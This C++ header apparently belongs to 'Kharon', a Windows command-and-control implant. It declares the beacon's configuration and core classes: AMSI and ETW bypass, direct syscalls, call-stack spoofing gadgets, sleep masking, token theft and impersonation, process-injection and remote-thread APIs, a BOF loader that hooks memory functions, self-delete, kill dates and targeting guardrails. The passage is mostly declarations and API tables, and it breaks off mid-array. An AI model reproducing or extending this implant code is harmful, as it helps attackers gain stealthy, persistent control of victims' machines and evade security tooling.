#ifndef KHARON_H
#define KHARON_H

#include <windows.h>
#include <winnt.h>
#include <ntstatus.h>
#include <guiddef.h>
#include <winsock.h>
#include <iphlpapi.h>
#include <ktmw32.h>
#include <stdio.h>
#include <aclapi.h>
#include <ws2tcpip.h>

#ifdef   WEB_WINHTTP
#include <winhttp.h>
#else
#include <wininet.h>
#endif

#include <KhError.h>
#include <Win32.h>
#include <Defines.h>
#include <Evasion.h>
#include <Misc.h>
#include <Communication.h>

EXTERN_C UPTR StartPtr();
EXTERN_C UPTR EndPtr();

struct _TOKEN_NODE {
    ULONG  TokenID; // fiction number generated from agent
    HANDLE Handle;
    PCHAR  User;
    ULONG  ProcessID;
    ULONG  ThreadID;
    PCHAR  Host;
    struct _TOKEN_NODE* Next;
}; 
typedef _TOKEN_NODE TOKEN_NODE;

struct _PRIV_LIST {
    ULONG Attributes;
    CHAR* PrivName;
};
typedef _PRIV_LIST PRIV_LIST;

typedef struct _HEAP_NODE {
    PVOID Block;
    ULONG Size;
    struct _HEAP_NODE* Next;
} HEAP_NODE;

class Crypt;
class Pivot;
class Coff;
class Beacon;
class Spoof;
class Syscall;
class Jobs;
class Useful;
class Memory;
class Mask;
class Package;
class Parser;
class Task;
class Thread;
class Process;
class Heap;
class Library;
class Transport;
class Token;
class Socket;

typedef struct {
    CHAR* AgentId;
    ULONG SleepTime;
    ULONG Jitter;
    BYTE  EncryptKey[16];
    ULONG BofProxy;
    BOOL  Syscall;
    ULONG AmsiEtwBypass;
    ULONG ChunkSize;

    ULONG Profile;

    struct {
        ULONG  ParentID;
        BOOL   Pipe;
        BOOL   BlockDlls;
        WCHAR* CurrentDir;
        WCHAR* SpoofArg;
    } Ps;

    struct {
        WCHAR* Spawnto;
        CHAR*  ForkPipe;
    } Postex;

    struct {
        CHAR* UserName;
        CHAR* DomainName;
        CHAR* IpAddress;
        CHAR* HostName;
    } Guardrails = {
        .UserName   = nullptr,
        .DomainName = nullptr,
        .IpAddress  = nullptr,
        .HostName   = nullptr
    };

    struct {
        UINT8 Beacon;
        BOOL  Heap;

        UPTR NtContinueGadget;
        UPTR JmpGadget;
    } Mask;

    struct {
        BOOL Enabled;

        INT16 StartHour;
        INT16 StartMin;

        INT16 EndHour;
        INT16 EndMin;
    } Worktime;

    struct {
        BOOL Enabled;
        BOOL SelfDelete; // if true, self delete the process binary of the disk (care should be taken within a grafted process to exclude an accidentally unintended binary.)
        BOOL ExitProc;   // if true, exit the process, else exit the thread

        INT16 Day;
        INT16 Month;
        INT16 Year;
    } KillDate;

    struct {
        PROXY_SETTINGS   Proxy;
        BOOL             Secure;
        ULONG            Strategy;
        ULONG            CallbacksCount;
        HTTP_CALLBACKS** Callbacks;
    } Http;
} KHARON_CONFIG;

auto DECLFN GetConfig( _Out_ KHARON_CONFIG* Cfg ) -> VOID;

struct _BEACON_INFO {
    PBYTE BeaconPtr;
    ULONG BeaconLength;

    struct {
        CHAR* AgentId;
        PCHAR CommandLine;
        PCHAR ImagePath;
        ULONG ProcessId;
        BOOL  Elevated;
    } Session;

    struct {
        PVOID NodeHead;
        ULONG EntryCount;
    } HeapRecords;

    KHARON_CONFIG* Config;
};
typedef _BEACON_INFO BEACON_INFO;

struct _JOBS {
    struct _JOBS* Next;

    PACKAGE* Pkg;
    PARSER*  Psr;
    ULONG    State;
    ULONG    ExitCode;
    PCHAR    UUID;
    ULONG    CmdID;
    BOOL     Clean;
    BOOL     PersistTriggered;

    PARSER* Destroy;  
};
typedef _JOBS JOBS;

namespace Root {
    class Kharon {    
    public:
        Crypt*     Crp; 
        Pivot*     Pvt;
        Beacon*    Bc;
        Coff*      Cf;
        Spoof*     Spf;
        Syscall*   Sys;
        Socket*    Skt;
        Jobs*      Jbs;
        Useful*    Usf;
        Library*   Lib;
        Token*     Tkn;
        Task*      Tsk;
        Heap*      Hp;
        Process*   Ps;
        Thread*    Td;
        Memory*    Mm;
        Transport* Tsp;
        Mask*      Mk;
        Parser*    Psr;
        Package*   Pkg;
    
        UINT64 MagicValue = KHARON_HEAP_MAGIC;

        KHARON_CONFIG Config;

        struct {
            COFF_MAPPED* Mapped;
            BOOL         IsLoaded;
            
            PVOID fn_inject;
            PVOID fn_poll;
            PVOID fn_kill;
            PVOID fn_list;
            PVOID fn_cleanup;
        } Postex;

        struct {
            ULONG AllocGran;
            ULONG PageSize;
            PCHAR CompName;
            PCHAR UserName;
            PCHAR DomName;
            PCHAR NetBios;
            ULONG IpAddress;
            PCHAR ProcessorName;
            ULONG ProcessorsNbr;
            ULONG AvalRAM;
            ULONG UsedRAM;
            ULONG TotalRAM;
            ULONG PercentRAM;
            BOOL  CfgEnabled;
            BYTE  OsArch;
            ULONG OsMjrV;
            ULONG OsMnrV;
            ULONG ProductType;
            ULONG OsBuild;
            BOOL  HvciEnabled;
            BOOL  DseEnabled;
            BOOL  SecureBootEnabled;
            BOOL  TestSigningEnabled;
            BOOL  DebugModeEnabled;
        } Machine;

        struct {
            PCHAR AgentID;
            UPTR  HeapHandle;
            ULONG ProcessID;
            ULONG ParentID;
            ULONG ThreadID;
            ULONG ProcessArch;
            PCHAR CommandLine;
            PCHAR ImagePath;
            BOOL  Elevated;
            BOOL  Connected;

            struct {
                UPTR Start;
                UPTR Length;
            } Base;        
        } Session = {
            .HeapHandle = U_PTR( NtCurrentPeb()->ProcessHeap ),
            .Connected  = FALSE,
        };

        struct {
            UPTR Handle;

            DECLAPI( getsockopt );
            DECLAPI( gethostbyname );
            DECLAPI( WSAGetLastError );
            DECLAPI( inet_ntoa );
            DECLAPI( WSAStartup );
            DECLAPI( WSASocketA );
            DECLAPI( WSACleanup );
            DECLAPI( __WSAFDIsSet );
            DECLAPI( shutdown );
            DECLAPI( closesocket );
            DECLAPI( getaddrinfo );
            DECLAPI( ntohs );
            DECLAPI( select );
            DECLAPI( send );
            DECLAPI( bind );
            DECLAPI( listen );
            DECLAPI( setsockopt );
            DECLAPI( connect );
            DECLAPI( inet_addr );
            DECLAPI( htons );
            DECLAPI( socket );
            DECLAPI( accept );
            DECLAPI( recv );
            DECLAPI( ioctlsocket );
            DECLAPI( freeaddrinfo );
        } Ws2_32 = {
            RSL_TYPE( getsockopt ),
            RSL_TYPE( gethostbyname ),
            RSL_TYPE( WSAGetLastError ),
            RSL_TYPE( inet_ntoa ),
            RSL_TYPE( WSAStartup ),
            RSL_TYPE( WSASocketA ),
            RSL_TYPE( WSACleanup ),
            RSL_TYPE( __WSAFDIsSet ),
            RSL_TYPE( shutdown ),
            RSL_TYPE( closesocket ),
            RSL_TYPE( getaddrinfo ),
            RSL_TYPE( ntohs ),
            RSL_TYPE( select ),
            RSL_TYPE( send ),
            RSL_TYPE( bind ),
            RSL_TYPE( listen ),
            RSL_TYPE( setsockopt ),
            RSL_TYPE( connect ),
            RSL_TYPE( inet_addr ),
            RSL_TYPE( htons ),
            RSL_TYPE( socket ),
            RSL_TYPE( accept ),
            RSL_TYPE( recv ),
            RSL_TYPE( ioctlsocket ),
            RSL_TYPE( freeaddrinfo )
        };

        struct {
            UPTR Handle;
        } KrnlBase;

        struct {
            UPTR Handle;

            DECLAPI( sprintf );
            DECLAPI( printf );
            DECLAPI( vprintf );
            DECLAPI( vsnprintf );
            DECLAPI( k_vscwprintf );
            DECLAPI( k_vswprintf );
            DECLAPI( k_swprintf );
            DECLAPI( wcscat );
            DECLAPI( wcscpy );
            DECLAPI( strncpy );
        } Msvcrt = {
            RSL_TYPE( sprintf ),
            RSL_TYPE( printf ),
            RSL_TYPE( vprintf ),
            RSL_TYPE( vsnprintf ),
            RSL_TYPE( k_vscwprintf ),
            RSL_TYPE( k_vswprintf ),
            RSL_TYPE( k_swprintf ),
            RSL_TYPE( wcscat ),
            RSL_TYPE( wcscpy ),
            RSL_TYPE( strncpy ),
        };

        struct {
            UPTR Handle;

            DECLAPI( StringCchPrintfW );
    
            DECLAPI( FreeLibrary );
            DECLAPI( LoadLibraryA ); 
            DECLAPI( LoadLibraryW );
            DECLAPI( GetProcAddress );
            DECLAPI( GetModuleHandleA );
            DECLAPI( GetModuleHandleW );
            DECLAPI( EnumProcessModules );
            DECLAPI( K32GetModuleFileNameExA );
            DECLAPI( GetModuleFileNameW );
            DECLAPI( Sleep );

            DECLAPI( GetSystemTime );

            DECLAPI( GetTickCount );

            DECLAPI( CreateTimerQueueTimer );

            DECLAPI( DuplicateHandle );
            DECLAPI( SetHandleInformation );
            DECLAPI( GetStdHandle );
            DECLAPI( SetStdHandle );

            DECLAPI( GetConsoleWindow );
            DECLAPI( AllocConsole );
            DECLAPI( FreeConsole );

            DECLAPI( CreateTransaction );

            DECLAPI( GetACP );
            DECLAPI( GetOEMCP );

            DECLAPI( GetFileSizeEx );
            DECLAPI( CreateFileA );
            DECLAPI( CreateFileW );
            DECLAPI( SetFilePointer );
            DECLAPI( GetFullPathNameA );
            DECLAPI( CreateFileTransactedA );
            DECLAPI( CreatePipe );
            DECLAPI( DisconnectNamedPipe );
            DECLAPI( FlushFileBuffers );
            DECLAPI( GetCurrentDirectoryA );
            DECLAPI( PeekNamedPipe );
            DECLAPI( ConnectNamedPipe );
            DECLAPI( WaitNamedPipeA );
            DECLAPI( GetOverlappedResult );
            DECLAPI( CreateNamedPipeA );
            DECLAPI( CreateDirectoryA );
            DECLAPI( DeleteFileA );
            DECLAPI( CopyFileA );
            DECLAPI( MoveFileA );
            DECLAPI( ReadFile );
            DECLAPI( WriteFile );
            DECLAPI( WriteFileEx );
            DECLAPI( SetCurrentDirectoryA );
            DECLAPI( GetFileSize );
            DECLAPI( FileTimeToSystemTime );
            DECLAPI( FindFirstFileA );
            DECLAPI( FindFirstFileW );
            DECLAPI( FindNextFileA );
            DECLAPI( FindNextFileW );
            DECLAPI( FindClose );
            DECLAPI( SetFileInformationByHandle );
        
            DECLAPI( CreateProcessA );
            DECLAPI( CreateProcessW );
            DECLAPI( GetExitCodeProcess );
            DECLAPI( OpenProcess );
            DECLAPI( IsWow64Process );
        
            DECLAPI( GetComputerNameExA );
        
            DECLAPI( TlsAlloc );
            DECLAPI( TlsSetValue );
            DECLAPI( TlsGetValue );
            DECLAPI( TerminateThread );
            DECLAPI( TerminateProcess );
            DECLAPI( GetExitCodeThread );
            DECLAPI( OpenThread );
            DECLAPI( SuspendThread );
            DECLAPI( ResumeThread );
            DECLAPI( CreateThread );
            DECLAPI( CreateRemoteThread );
            DECLAPI( GetThreadId );

            DECLAPI( BaseThreadInitThunk );
        
            DECLAPI( GlobalMemoryStatusEx );
            DECLAPI( GetNativeSystemInfo );
            DECLAPI( FormatMessageA );
        
            DECLAPI( WaitForSingleObject );
            DECLAPI( WaitForSingleObjectEx );

            DECLAPI( LocalAlloc   );
            DECLAPI( LocalReAlloc );
            DECLAPI( LocalFree    );

            DECLAPI( GetVersionExA );
        
            DECLAPI( SetEvent );
            DECLAPI( CreateEventA );

            DECLAPI( VirtualProtect );
            DECLAPI( VirtualProtectEx );
            DECLAPI( VirtualAlloc );
            DECLAPI( VirtualAllocEx );
            DECLAPI( VirtualQuery );
            DECLAPI( VirtualQueryEx );
            DECLAPI( VirtualFreeEx );
            DECLAPI( VirtualFree );
            DECLAPI( WriteProcessMemory );
            DECLAPI( ReadProcessMemory );

            DECLAPI( AddVectoredExceptionHandler );
            DECLAPI( RemoveVectoredContinueHandler );

            DECLAPI( InitializeCriticalSection );
            DECLAPI( EnterCriticalSection );
            DECLAPI( LeaveCriticalSection );
            DECLAPI( DeleteCriticalSection );

            DECLAPI( InitializeProcThreadAttributeList );
            DECLAPI( UpdateProcThreadAttribute );
            DECLAPI( DeleteProcThreadAttributeList );
        } Krnl32 = {
            RSL_TYPE( StringCchPrintfW ),
            
            RSL_TYPE( FreeLibrary ),
            RSL_TYPE( LoadLibraryA ),
            RSL_TYPE( LoadLibraryW ),
            RSL_TYPE( GetProcAddress ),
            RSL_TYPE( GetModuleHandleA ),
            RSL_TYPE( GetModuleHandleW ),
            RSL_TYPE( EnumProcessModules ),
            RSL_TYPE( K32GetModuleFileNameExA ),
            RSL_TYPE( GetModuleFileNameW ),
            RSL_TYPE( Sleep ),

            RSL_TYPE( GetSystemTime ),

            RSL_TYPE( GetTickCount ),

            RSL_TYPE( CreateTimerQueueTimer ),

            RSL_TYPE( DuplicateHandle ),
            RSL_TYPE( SetHandleInformation ),
            RSL_TYPE( GetStdHandle ),
            RSL_TYPE( SetStdHandle ),

            RSL_TYPE( GetConsoleWindow ),
            RSL_TYPE( AllocConsole ),
            RSL_TYPE( FreeConsole ),
        
            RSL_TYPE( CreateTransaction ),

            RSL_TYPE( GetACP ),
            RSL_TYPE( GetOEMCP ),

            RSL_TYPE( GetFileSizeEx ),
            RSL_TYPE( CreateFileA ),
            RSL_TYPE( CreateFileW ),
            RSL_TYPE( SetFilePointer ),
            RSL_TYPE( GetFullPathNameA ),
            RSL_TYPE( CreateFileTransactedA ),
            RSL_TYPE( CreatePipe ),
            RSL_TYPE( GetCurrentDirectoryA ),
            RSL_TYPE( PeekNamedPipe ),
            RSL_TYPE( ConnectNamedPipe ),
            RSL_TYPE( WaitNamedPipeA ),
            RSL_TYPE( CreateNamedPipeA ),
            RSL_TYPE( CreateDirectoryA ),
            RSL_TYPE( DeleteFileA ),
            RSL_TYPE( CopyFileA ),
            RSL_TYPE( MoveFileA ),
            RSL_TYPE( ReadFile ),
            RSL_TYPE( WriteFile ),
            RSL_TYPE( WriteFileEx ),
            RSL_TYPE( SetCurrentDirectoryA ),
            RSL_TYPE( GetFileSize ),
            RSL_TYPE( FileTimeToSystemTime ),
            RSL_TYPE( FindFirstFileA ),
            RSL_TYPE( FindFirstFileW ),
            RSL_TYPE( FindNextFileA ),
            RSL_TYPE( FindNextFileW ),
            RSL_TYPE( FindClose ),
            RSL_TYPE( SetFileInformationByHandle ),
        
            RSL_TYPE( CreateProcessA ),
            RSL_TYPE( CreateProcessW ),
            RSL_TYPE( OpenProcess ),
            RSL_TYPE( IsWow64Process ),
        
            RSL_TYPE( GetComputerNameExA ),
        
            RSL_TYPE( TlsAlloc ),
            RSL_TYPE( TlsSetValue ),
            RSL_TYPE( TlsGetValue ),
            RSL_TYPE( TerminateThread ),
            RSL_TYPE( TerminateProcess ),
            RSL_TYPE( OpenThread ),
            RSL_TYPE( SuspendThread ),
            RSL_TYPE( ResumeThread ),
            RSL_TYPE( CreateThread ),
            RSL_TYPE( CreateRemoteThread ),
            RSL_TYPE( GetThreadId ),
        
            RSL_TYPE( BaseThreadInitThunk ),

            RSL_TYPE( GlobalMemoryStatusEx ),
            RSL_TYPE( GetNativeSystemInfo ),
            RSL_TYPE( FormatMessageA ),
        
            RSL_TYPE( WaitForSingleObject ),
            RSL_TYPE( WaitForSingleObjectEx ),

            RSL_TYPE( LocalAlloc   ),
            RSL_TYPE( LocalReAlloc ),
            RSL_TYPE( LocalFree    ),

            RSL_TYPE( GetVersionExA ),

            RSL_TYPE( SetEvent ),
        
            RSL_TYPE( VirtualProtect ),
            RSL_TYPE( VirtualProtectEx ),
            RSL_TYPE( VirtualAlloc ),
            RSL_TYPE( VirtualAllocEx ),
            RSL_TYPE( VirtualQuery ),
            RSL_TYPE( VirtualQueryEx ),
            RSL_TYPE( VirtualFreeEx ),
            RSL_TYPE( VirtualFree ),
            RSL_TYPE( WriteProcessMemory ),
            RSL_TYPE( ReadProcessMemory ),

            RSL_TYPE( AddVectoredExceptionHandler ),
            RSL_TYPE( RemoveVectoredContinueHandler ),

            RSL_TYPE( InitializeCriticalSection ),
            RSL_TYPE( EnterCriticalSection ),
            RSL_TYPE( LeaveCriticalSection ),
            RSL_TYPE( DeleteCriticalSection ),

            RSL_TYPE( InitializeProcThreadAttributeList ),
            RSL_TYPE( UpdateProcThreadAttribute ),
            RSL_TYPE( DeleteProcThreadAttributeList )
        };

        struct {
            UPTR Handle;

            DECLAPI( RtlLookupFunctionEntry );
            DECLAPI( RtlIpv4StringToAddressA );

            DECLAPI( RtlNtStatusToDosError );
            DECLAPI( DbgPrint );
            DECLAPI( NtClose );
            DECLAPI( RtlRandomEx );

    
            DECLAPI( NtAllocateVirtualMemory );
            DECLAPI( NtWriteVirtualMemory );
            DECLAPI( NtFreeVirtualMemory );
            DECLAPI( NtProtectVirtualMemory );
            DECLAPI( NtReadVirtualMemory );
            DECLAPI( NtCreateSection );
            DECLAPI( NtMapViewOfSection );

            DECLAPI( khRtlFillMemory );

            DECLAPI( LdrGetProcedureAddress );

            DECLAPI( NtOpenThreadTokenEx );
            DECLAPI( NtOpenProcessTokenEx );
    
            DECLAPI( NtOpenProcess );
            DECLAPI( NtCreateThreadEx ); 
            DECLAPI( NtOpenThread );
            DECLAPI( RtlExitUserThread );
            DECLAPI( RtlExitUserProcess );

            DECLAPI( RtlUserThreadStart );
    
            DECLAPI( RtlCaptureContext );
            DECLAPI( NtGetContextThread );
            DECLAPI( NtSetContextThread );
            DECLAPI( NtCreateEvent ); 
            DECLAPI( NtSetEvent );
            DECLAPI( NtContinue );
    
            DECLAPI( NtWaitForSingleObject );
            DECLAPI( NtSignalAndWaitForSingleObject );
    
            DECLAPI( NtSetInformationVirtualMemory );
    
            DECLAPI( NtQueryInformationToken );
            DECLAPI( NtQueryInformationProcess );
            DECLAPI( NtQuerySystemInformation );

            DECLAPI( NtTestAlert );
            DECLAPI( NtAlertResumeThread );
            DECLAPI( NtQueueApcThread );

            DECLAPI( RtlAllocateHeap   );
            DECLAPI( RtlReAllocateHeap );
            DECLAPI( RtlFreeHeap       );
    
            DECLAPI( RtlQueueWorkItem );

            DECLAPI( TpAllocTimer );
            DECLAPI( TpSetTimer );
            DECLAPI( RtlCreateTimer );
            DECLAPI( RtlDeleteTimer );
            DECLAPI( RtlCreateTimerQueue );
            DECLAPI( RtlDeleteTimerQueue );

            DECLAPI( RtlAddFunctionTable );

            DECLAPI( RtlAddVectoredExceptionHandler );
            DECLAPI( RtlAddVectoredContinueHandler );
            DECLAPI( RtlRemoveVectoredContinueHandler );
            DECLAPI( RtlRemoveVectoredExceptionHandler );

            DECLAPI( RtlInitializeCriticalSection );
            DECLAPI( RtlLeaveCriticalSection );
            DECLAPI( RtlEnterCriticalSection );
            DECLAPI( RtlDeleteCriticalSection );
        } Ntdll = {
            RSL_TYPE( RtlLookupFunctionEntry ),
            RSL_TYPE( RtlIpv4StringToAddressA ),

            RSL_TYPE( RtlNtStatusToDosError ),
            RSL_TYPE( DbgPrint ),
            RSL_TYPE( NtClose ),
            RSL_TYPE( RtlRandomEx ),
    
            RSL_TYPE( NtAllocateVirtualMemory ),
            RSL_TYPE( NtWriteVirtualMemory ),
            RSL_TYPE( NtFreeVirtualMemory ),
            RSL_TYPE( NtProtectVirtualMemory ),
            RSL_TYPE( NtReadVirtualMemory ),
            RSL_TYPE( NtCreateSection ),
            RSL_TYPE( NtMapViewOfSection ),

            RSL_TYPE( khRtlFillMemory ),

            RSL_TYPE( LdrGetProcedureAddress ),
    
            RSL_TYPE( NtOpenThreadTokenEx ),
            RSL_TYPE( NtOpenProcessTokenEx ),

            RSL_TYPE( NtOpenProcess ),
            RSL_TYPE( NtCreateThreadEx ),
            RSL_TYPE( NtOpenThread ),
            RSL_TYPE( RtlExitUserThread ),
            RSL_TYPE( RtlExitUserProcess ),

            RSL_TYPE( RtlUserThreadStart ),
    
            RSL_TYPE( RtlCaptureContext ),
            RSL_TYPE( NtGetContextThread ),
            RSL_TYPE( NtSetContextThread ),
            RSL_TYPE( NtCreateEvent ),
            RSL_TYPE( NtSetEvent ),
            RSL_TYPE( NtContinue ),
    
            RSL_TYPE( NtWaitForSingleObject ),
            RSL_TYPE( NtSignalAndWaitForSingleObject ),
    
            RSL_TYPE( NtSetInformationVirtualMemory ),

            RSL_TYPE( NtQueryInformationToken ),
            RSL_TYPE( NtQueryInformationProcess ),
            RSL_TYPE( NtQuerySystemInformation ),
    
            RSL_TYPE( NtTestAlert ),
            RSL_TYPE( NtAlertResumeThread ),
            RSL_TYPE( NtQueueApcThread ),
    
            RSL_TYPE( RtlAllocateHeap   ),
            RSL_TYPE( RtlReAllocateHeap ),
            RSL_TYPE( RtlFreeHeap       ),

            RSL_TYPE( RtlQueueWorkItem ),

            RSL_TYPE( TpAllocTimer ),
            RSL_TYPE( TpSetTimer ),
            RSL_TYPE( RtlCreateTimer ),
            RSL_TYPE( RtlDeleteTimer ),
            RSL_TYPE( RtlCreateTimerQueue ),
            RSL_TYPE( RtlDeleteTimerQueue ),

            RSL_TYPE( RtlAddFunctionTable ),

            RSL_TYPE( RtlAddVectoredExceptionHandler ),
            RSL_TYPE( RtlAddVectoredContinueHandler ),
            RSL_TYPE( RtlRemoveVectoredContinueHandler ),
            RSL_TYPE( RtlRemoveVectoredExceptionHandler ),

            RSL_TYPE( RtlInitializeCriticalSection ),
            RSL_TYPE( RtlLeaveCriticalSection ),
            RSL_TYPE( RtlEnterCriticalSection ),
            RSL_TYPE( RtlDeleteCriticalSection ),
        };

        struct {
            UPTR Handle;

            DECLAPI( GetAdaptersInfo );
        } Iphlpapi = {
            RSL_TYPE( GetAdaptersInfo )
        };

        struct {
            UPTR Handle;

	    DECLAPI( wsprintfW );
            DECLAPI( ShowWindow );
        } User32 = {
	    RSL_TYPE( wsprintfW ),
            RSL_TYPE( ShowWindow ),
        };

        struct {
            UPTR Handle;

            DECLAPI( AllocateAndInitializeSid );
            DECLAPI( SetEntriesInAclA );
            DECLAPI( InitializeSecurityDescriptor );
            DECLAPI( SetSecurityDescriptorSacl );
            DECLAPI( SetSecurityDescriptorDacl );
            DECLAPI( ImpersonateLoggedOnUser );
            DECLAPI( RevertToSelf );

            DECLAPI( LookupAccountSidW );
            DECLAPI( LookupAccountSidA );
            DECLAPI( LookupPrivilegeValueA );
            DECLAPI( LookupPrivilegeNameA );
            DECLAPI( AdjustTokenPrivileges );
            DECLAPI( OpenProcessToken );
            DECLAPI( OpenThreadToken );
            DECLAPI( GetTokenInformation );
            DECLAPI( DuplicateTokenEx );
            DECLAPI( LogonUserA );

            DECLAPI( GetUserNameA );

            DECLAPI( RegOpenKeyExA    );
            DECLAPI( RegQueryValueExA );
            DECLAPI( RegCloseKey      );
        } Advapi32 = {
            RSL_TYPE( AllocateAndInitializeSid ),
            RSL_TYPE( SetEntriesInAclA ),
            RSL_TYPE( InitializeSecurityDescriptor ),
            RSL_TYPE( SetSecurityDescriptorSacl ),
            RSL_TYPE( SetSecurityDescriptorDacl ),
            RSL_TYPE( ImpersonateLoggedOnUser ),
            RSL_TYPE( RevertToSelf ),

            RSL_TYPE( LookupAccountSidW ),
            RSL_TYPE( LookupAccountSidA ),
            RSL_TYPE( LookupPrivilegeValueA ),
            RSL_TYPE( LookupPrivilegeNameA ),
            RSL_TYPE( AdjustTokenPrivileges ),
            RSL_TYPE( OpenProcessToken ),
            RSL_TYPE( OpenThreadToken ),
            RSL_TYPE( GetTokenInformation ),
            RSL_TYPE( DuplicateTokenEx ),
            RSL_TYPE( LogonUserA ),

            RSL_TYPE( GetUserNameA ),

            RSL_TYPE( RegOpenKeyExA    ),
            RSL_TYPE( RegQueryValueExA ),
            RSL_TYPE( RegCloseKey      ),
        };

        struct {
            UPTR Handle;

            DECLAPI( SystemFunction040 );
            DECLAPI( SystemFunction041 );
        } Cryptbase = {
            RSL_TYPE( SystemFunction040 ),
            RSL_TYPE( SystemFunction041 ),
        };

        struct {
            UPTR Handle;
    
            DECLAPI( InternetOpenW       );
            DECLAPI( InternetConnectW    );
            DECLAPI( HttpOpenRequestW    );
	        DECLAPI( HttpAddRequestHeadersW );
            DECLAPI( InternetSetOptionW  );
            DECLAPI( InternetSetCookieW  );
            DECLAPI( InternetSetCookieA  );
            DECLAPI( InternetGetCookieA  );
            DECLAPI( InternetGetCookieW  );
            DECLAPI( InternetGetCookieExA  );
            DECLAPI( HttpSendRequestW    );
            DECLAPI( HttpQueryInfoW      );
            DECLAPI( InternetReadFile    );
            DECLAPI( InternetCloseHandle );
        } Wininet = {
            RSL_TYPE( InternetOpenW       ),
            RSL_TYPE( InternetConnectW    ),
            RSL_TYPE( HttpOpenRequestW    ),
	        RSL_TYPE( HttpAddRequestHeadersW ),
            RSL_TYPE( InternetSetOptionW  ),
            RSL_TYPE( InternetSetCookieW  ),
            RSL_TYPE( InternetSetCookieA  ),
            RSL_TYPE( InternetGetCookieA  ),
            RSL_TYPE( InternetGetCookieW  ),
            RSL_TYPE( InternetGetCookieExA  ),
            RSL_TYPE( HttpSendRequestW    ),
            RSL_TYPE( HttpQueryInfoW      ),
            RSL_TYPE( InternetReadFile    ),
            RSL_TYPE( InternetCloseHandle ),
        };

        explicit Kharon();

        auto Init(
            VOID
        ) -> VOID;

        auto Start(
            _In_ UPTR Argument
        ) -> VOID;

        VOID InitCrypt( Crypt* CryptRf ) { Crp = CryptRf; }
        VOID InitCoff( Coff* CoffRf ) { Cf = CoffRf; }
        VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
        VOID InitSyscall( Syscall* SyscallRf ) { Sys = SyscallRf; }
        VOID InitSocket( Socket* SocketRf ) { Skt = SocketRf; }
        VOID InitJobs( Jobs* JobsRf ) { Jbs = JobsRf; }
        VOID InitUseful( Useful* UsefulRf ) { Usf = UsefulRf; }
        VOID InitToken( Token* TokenRf ) { Tkn = TokenRf; } 
        VOID InitHeap( Heap* HeapRf ) { Hp = HeapRf; } 
        VOID InitLibrary( Library* LibRf ) { Lib = LibRf; }
        VOID InitThread( Thread* ThreadRf ) { Td = ThreadRf; }
        VOID InitProcess( Process* ProcessRf ) { Ps = ProcessRf; }
        VOID InitTask( Task* TaskRf ) { Tsk = TaskRf; }
        VOID InitTransport( Transport* TransportRf ) { Tsp = TransportRf; }
        VOID InitPackage( Package* PackageRf ) { Pkg = PackageRf; }
        VOID InitParser( Parser* ParserRf ) { Psr = ParserRf; }
        VOID InitMask( Mask* MaskRf ) { Mk = MaskRf; }
        VOID InitMemory( Memory* MemoryRf ) { Mm = MemoryRf; }
    };
}

typedef struct {
    ULONG SymHash;
    PVOID SymPtr;
} COFF_API, *PCOFF_API;

typedef struct {
	PCHAR original;
	PCHAR buffer; 
	INT   length;  
	INT   size;     
} DATAP;

typedef struct {
	PCHAR original; 
	PCHAR buffer;   
	INT   length;   
	INT   size;     
} FMTP;

#define BLOCK_SIZE 8
#define NUM_ROUNDS 16

class Crypt {
private:
    Root::Kharon* Self;    
public:
    Crypt( Root::Kharon* KharonRf ) : Self( KharonRf ) {}

    UCHAR LokKey[16] = KH_CRYPT_KEY;
    UCHAR XorKey[16] = KH_CRYPT_KEY;

    auto CalcPadding( ULONG Length ) -> ULONG;

    auto AddPadding( PBYTE Block, ULONG Length, ULONG TotalSize ) -> VOID;
    auto RmPadding( PBYTE Block, ULONG &Length ) -> VOID;

    auto Cycle( PBYTE Block, LOKY_CRYPT Loky ) -> VOID;
    auto Encrypt( PBYTE Block, ULONG Length ) -> VOID;
    auto Decrypt( PBYTE Block, ULONG &Length ) -> VOID;
    auto Xor( _In_opt_ PBYTE Bin, _In_ SIZE_T BinSize ) -> VOID;
};

class Spoof {
private:
    Root::Kharon* Self;    
public:
    Spoof( Root::Kharon* KharonRf ) : Self( KharonRf ) {}

    struct {
        FRAME_INFO First;   // 0x00  // RtlUserThreadStart+0x21
        FRAME_INFO Second;  // 0x10  // BaseThreadInitThunk+0x14
        FRAME_INFO Gadget;  // 0x20  // rbp gadget
        
        UPTR Restore;      // 0x30
        UPTR Ssn;          // 0x38
        UPTR Ret;          // 0x40
        
        UPTR Rbx;          // 0x48
        UPTR Rdi;          // 0x50
        UPTR Rsi;          // 0x58
        UPTR R12;          // 0x60
        UPTR R13;          // 0x68
        UPTR R14;          // 0x70
        UPTR R15;          // 0x78

        UPTR ArgCount;     // 0x80
        UPTR OriginalRsp;  // 0x88  
    } Setup = {
        .First { 
            .Ptr = (UPTR)this->Self->Ntdll.RtlUserThreadStart + 0x21
        },
        .Second {
            .Ptr = (UPTR)this->Self->Krnl32.BaseThreadInitThunk + 0x14,
        },
    };

    auto Call( 
        _In_ UPTR Fnc, _In_ UPTR Ssn,
        _In_ UPTR Arg1  = 0, _In_ UPTR Arg2  = 0, _In_ UPTR Arg3  = 0,
        _In_ UPTR Arg4  = 0, _In_ UPTR Arg5  = 0, _In_ UPTR Arg6  = 0,
        _In_ UPTR Arg7  = 0, _In_ UPTR Arg8  = 0, _In_ UPTR Arg9  = 0,
        _In_ UPTR Arg10 = 0, _In_ UPTR Arg11 = 0, _In_ UPTR Arg12 = 0
    ) -> UPTR;

    auto StackSizeWrapper( _In_ UPTR RetAddress ) -> UPTR;
    auto StackSize( _In_ UPTR RtmFunction, _In_ UPTR ImgBase ) -> UPTR;
};

class Coff {
public:
    Root::Kharon* Self;   

    Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {}

    PPACKAGE Pkg = { 0 };

    VALUE_DICT* UserData  = nullptr;
    BOF_OBJ*    Node      = nullptr;
    ULONG       ObjCount  = 0;

    // hooks call from bof table
    struct {
        UPTR Hash;
        UPTR Ptr;
    } HookTable[20] = {
        HookTable[0]  = { Hsh::Str( "VirtualAlloc" ),       (UPTR)Self->Cf->VirtualAlloc },
        HookTable[1]  = { Hsh::Str( "VirtualAllocEx" ),     (UPTR)Self->Cf->VirtualAllocEx },
        HookTable[2]  = { Hsh::Str( "VirtualProtect" ),     (UPTR)Self->Cf->VirtualProtect },
        HookTable[3]  = { Hsh::Str( "VirtualProtectEx" ),   (UPTR)Self->Cf->VirtualProtectEx },
        HookTable[4]  = { Hsh::Str( "WriteProcessMemory" ), (UPTR)Self->Cf->WriteProcessMemory },
        HookTable[5]  = { Hsh::Str( "ReadProcessMemory" ),  (UPTR)Self->Cf->ReadProcessMemory },
